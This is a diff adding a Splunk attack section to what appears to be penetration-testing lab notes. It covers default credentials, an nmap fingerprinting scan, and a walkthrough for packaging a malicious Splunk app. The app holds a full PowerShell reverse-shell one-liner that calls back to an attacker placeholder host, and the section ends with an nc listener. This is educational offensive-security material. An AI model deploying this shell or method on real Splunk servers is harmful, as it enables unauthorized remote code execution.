@@ -26,6 +26,7 @@ This document outlines common techniques for identifying and exploiting vulnerab
   
   - [Infrastructure/Network Monitoring](#infrastructurenetwork-monitoring)
     - [Splunk - Discovery and Enumeration](#splunk---discovery-and-enumeration)
+    - [Attacking Splunk](#attacking-splunk)
 ---
 
 ## Overview
@@ -1094,3 +1095,126 @@ After starting a listener on the attacker machine, this results in an **interact
 ---
 
 ### Splunk - Discovery and Enumeration
+
+Splunk is a log analytics and monitoring platform used to collect, analyze, and visualize large volumes of data. It is commonly deployed for **security monitoring**, **incident response**, and **business analytics**, and often stores **highly sensitive information**, making it an attractive target during penetration tests.
+
+Splunk has historically suffered from relatively few critical vulnerabilities, with most serious issues being quickly patched. Two notable examples include:
+
+- [CVE-2018-11409](https://nvd.nist.gov/vuln/detail/cve-2018-11409)
+  - Information disclosure vulnerability
+- [CVE-2011-4632](https://nvd.nist.gov/vuln/detail/CVE-2011-4642)
+  - Remote code execution vulnerability
+
+Because Splunk vulnerabilities are uncommon, the **primary attack vector** from an attacker’s perspective is **weak**, **default**, or **missing authentication**. Administrative access to Splunk allows users to deploy **custom applications and scripts**, which can be abused to obtain remote code execution.
+
+Splunk is frequently encountered during **internal penetration tests**, especially in large corporate environments. It often runs as `root` on Linux or `SYSTEM` on Windows, significantly increasing the impact of successful exploitation.
+
+Older versions of Splunk ship with default credentials:
+
+```
+admin:changeme
+```
+
+Newer versions prompt the administrator to set credentials during installation. If default credentials fail, it is always worth testing for **weak or commonly reused passwords**.
+
+Additionally, the **Splunk Enterprise trial** automatically converts to a **free version after 60 days**. The free version **does not require authentication**, which can introduce a serious security risk if administrators forget to secure or remove the instance.
+
+![Filtered output](images/splunk3.PNG)
+
+Splunk can often be identified through an `nmap` scan:
+
+```
+sudo nmap -p- -sV 10.129.163.3
+```
+
+In this case, Splunk is detected running on:
+
+- Port `8000` — Web interface
+- Port `8089` — Management port used for the Splunk REST API
+
+![Filtered output](images/splunk.PNG)
+
+The Splunk version can often be fingerprinted directly from the **page source** of the web interface:
+
+![Filtered output](images/splunk2.PNG)
+
+Splunk provides several built-in mechanisms that allow execution of system commands, including:
+
+- Server-side Django applications
+- REST endpoints
+- Scripted inputs
+- Alerting scripts
+
+Among these, **scripted inputs** are the most straightforward and commonly abused technique. Every Splunk installation includes **Python**, and attackers with administrative access can configure scripted inputs to execute arbitrary Python code, including **reverse shells**.
+
+---
+
+### Attacking Splunk
+
+During the enumeration phase, we identified that the target was running **Splunk on a Windows server**. With administrative access, Splunk allows users to deploy **custom applications**, which can be abused to achieve remote code execution using Python or PowerShell.
+
+A public repository containing prebuilt Splunk reverse shells for both languages can be found at:
+
+```
+https://github.com/0xjpuff/reverse_shell_splunk
+```
+
+To create a malicious Splunk application, the following directory structure must be respected:
+
+```bash
+tree reverse_shell_splunk/
+```
+
+![Filtered output](images/splunk4.PNG)
+
+- The `/bin` directory contains scripts that will be executed by Splunk
+- The `/default` directory contains configuration files, such as `inputs.conf`, which define how and when scripts are run
+
+
+In this example, we use a PowerShell reverse shell (`rev.ps1`) executed by Splunk. The script establishes a TCP connection back to the attacker:
+
+```ps1
+#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
+$client = New-Object System.Net.Sockets.TCPClient('attacker_ip_here',attacker_port_here);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+The `inputs.conf` file instructs Splunk which script to run and how often to run it using the `interval` directive:
+
+```bash
+cat ./reverse_shell_splunk/default/inputs.conf
+```
+
+![Filtered output](images/splunk5.PNG)
+
+A Windows batch file (`run.bat`) is used to execute the PowerShell script when the application is deployed:
+
+```bash
+cat ./reverse_shell_splunk/bin/run.bat
+```
+
+![Filtered output](images/splunk6.PNG)
+
+Once all files are in place, the application is packaged into a tarball:
+
+```bash
+tar -cvzf updater.tar.gz reverse_shell_splunk/
+```
+
+![Filtered output](images/splunk7.PNG)
+
+The application can then be uploaded via the Splunk web interface:
+- `Splunk Apps` &rarr; `Apps` &rarr; `Manage Apps` &rarr; `Install App From file`
+
+![Filtered output](images/splunk8.PNG)
+
+Start a listener on the attacker machine:
+
+```bash
+nc -lvnp 1337
+```
+
+As soon as the application is uploaded, Splunk executes the scripted input, triggering the reverse shell:
+
+![Filtered output](images/splunk9.PNG)
+
+---
